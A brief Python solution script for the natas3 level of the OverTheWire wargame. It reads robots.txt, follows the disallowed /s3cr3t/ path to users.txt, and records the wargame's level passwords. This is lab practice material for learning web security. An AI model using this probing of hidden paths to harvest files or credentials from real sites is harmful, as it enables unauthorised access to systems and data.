import requests,re


username="natas3"
password="sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"

url=str("http://%s.natas.labs.overthewire.org/robots.txt" %username)

r=requests.post(url,auth=(username,password))

print(r.text)
#"User-agent: *
#Disallow: /s3cr3t/

url=str("http://%s.natas.labs.overthewire.org/s3cr3t/users.txt" %username)

r=requests.post(url,auth=(username,password))

print(r.text)

#natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ